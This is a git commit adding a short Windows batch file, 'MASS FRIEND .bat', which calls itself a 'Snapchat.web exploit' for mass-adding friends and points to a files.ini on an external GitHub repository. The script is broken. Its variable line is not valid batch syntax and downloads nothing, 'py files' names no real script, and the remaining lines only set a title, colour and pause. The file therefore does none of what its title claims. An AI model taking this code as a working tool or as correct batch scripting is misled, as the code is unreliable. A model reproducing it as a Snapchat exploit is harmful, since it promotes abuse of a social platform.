cf511e0f137810fb75ce66887bd4b79961da4689
natrix_dev <discordlenko@gmail.com>
2022-09-24 10:12:37 +0200

    Create MASS FRIEND .bat

---
+++ MASS FRIEND .bat
@@ -0,0 +1,8 @@
+title Welcome - Snapchat.web exploit 
+@echo By github.com/natrixdev
+@echo off 
+files = files.ini --/-- https://github.com/natrixdev/snapchat-mass-friend/blob/main/files.ini
+py files
+color a 
+cls 
+pause 
